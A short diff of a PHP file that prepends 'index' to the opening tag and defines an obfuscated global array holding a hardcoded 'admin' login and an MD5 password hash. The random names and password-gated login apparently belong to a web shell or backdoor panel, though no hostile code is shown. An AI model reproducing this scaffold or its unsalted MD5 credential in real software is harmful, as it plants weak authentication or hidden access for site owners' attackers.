@@ -1,4 +1,4 @@
-<?php
+index<?php
 $GLOBALS['NeUSMyPGXP'] = array(
 	'usmfzmlHFCje' => 'admin',//login username
 	'paLDRhHfAovu' => 'a6f452ec3293d7fb72c5b677257b20ec',//login password (MD5)... ehsan
